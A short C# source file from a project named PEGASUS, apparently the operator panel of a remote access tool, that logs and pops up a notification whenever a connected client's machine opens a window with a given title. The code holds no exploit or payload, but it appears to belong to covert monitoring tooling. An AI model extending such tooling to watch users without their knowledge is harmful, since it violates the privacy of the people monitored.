using System.Drawing;
using PEGASUS.Diadyktio;
using PEGASUS.Properties;

namespace PEGASUS.BytesInOut
{
	public class HandleReportWindow
	{
		public HandleReportWindow(Clients client, string title)
		{
			new HandleLogs().Addmsg("Client " + client.Ip + " opened [" + title + "]", Color.Blue);
			if (PEGASUS.Properties.Settings.Default.Notification)
			{
				Program.form1.notifyIcon1.BalloonTipText = "Client " + client.Ip + " opened [" + title + "]";
				Program.form1.notifyIcon1.ShowBalloonTip(100);
			}
		}
	}
}
